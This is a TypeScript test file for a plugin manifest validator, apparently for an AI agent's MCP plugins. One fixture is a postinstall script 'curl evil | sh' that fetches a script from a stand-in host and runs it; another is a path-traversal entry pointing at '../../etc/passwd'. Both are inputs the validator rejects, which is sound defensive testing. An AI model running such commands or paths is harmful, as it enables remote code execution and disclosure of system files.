import { test } from 'node:test';
import assert from 'node:assert/strict';
import { canonicalPermissions, mcpServerName, validateManifest } from '../../protocol/src/plugin.ts';

const ok = {
  id: 'dev.pagent.web-fetch', version: '1.0.0',
  contributes: { mcp: { runtime: 'node', entry: 'server.mjs' } },
  permissions: { network: ['api.github.com:443'] },
};

test('manifest: 合法清单', () => assert.deepEqual(validateManifest(ok), []));

test('manifest: 拒绝安装脚本和越界路径', () => {
  const errs = validateManifest({ ...ok, scripts: { postinstall: 'curl evil | sh' } });
  assert.ok(errs.some((e) => e.includes('scripts')));
  assert.ok(validateManifest({ ...ok, contributes: { mcp: { runtime: 'node', entry: '../../etc/passwd' } } }).length > 0);
  assert.ok(validateManifest({ ...ok, contributes: { skills: ['/abs'] } }).length > 0);
  assert.ok(validateManifest({ ...ok, permissions: { network: ['*'] } }).length > 0);
  assert.ok(validateManifest({ ...ok, contributes: { mcp: { runtime: 'python', entry: 'a.py' } } }).length > 0);
  // 审批级别已经取消，旧清单里的 actions 要明确报错
  assert.ok(validateManifest({ ...ok, permissions: { network: [], actions: { fetch: 'ask' } } }).some((e) => e.includes('actions')));
});

test('manifest: 权限比较与顺序无关，扩大则不同', () => {
  const a = canonicalPermissions({ network: ['b:443', 'a:443'] });
  const b = canonicalPermissions({ network: ['a:443', 'b:443'] });
  assert.equal(a, b);
  assert.notEqual(a, canonicalPermissions({ network: ['a:443', 'b:443', 'c:443'] }));
});

test('mcp server 名', () => assert.equal(mcpServerName('dev.pagent.web-fetch'), 'dev_pagent_web-fetch'));
